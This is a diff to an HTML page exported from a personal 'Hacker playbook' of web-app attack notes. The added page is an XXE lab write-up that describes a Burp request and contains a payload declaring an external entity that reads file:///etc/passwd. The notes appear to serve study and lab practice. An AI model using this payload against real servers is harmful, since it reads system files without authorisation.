@@ -1,11 +1,11 @@
 <!doctype html><html>
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>secnotes.ctb</title>
+  <title>lab</title>
   <meta name="generator" content="CherryTree">
   <link rel="stylesheet" href="styles.css" type="text/css" />
 </head>
-<body><div class="tree">
+<body><div class="main"><div class="tree">
 <p><strong>Index</strong></p>
 <p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>
 
@@ -50,4 +50,5 @@
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
 </ol></ol></div>
+<div class="page"><h1><b><u>lab</u></b></h1><br />Make a simple request and get the responce from BURP :<br /><br /><br /><img src="images/696-1.png" alt="images/696-1.png" /><br /><br /><br />So <br /><br />XML = version 1.0<br />Doctype root element is “thp”<br />!ELEMENT speciafy any type<br />!ENTITY set the book to the string “Universe”<br />Finaly the XML output<br /><br />Original request :<br /><br /><img src="images/696-2.png" alt="images/696-2.png" /><br /><br />data=&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE thp [ &lt;!ELEMENT thp ANY&gt;&lt;!ENTITY book SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;thp&gt;Hack The %26book%3b&lt;/thp&gt;<br /><br /><br /><br /><img src="images/696-3.png" alt="images/696-3.png" /><br /></div></div>
 </body></html>
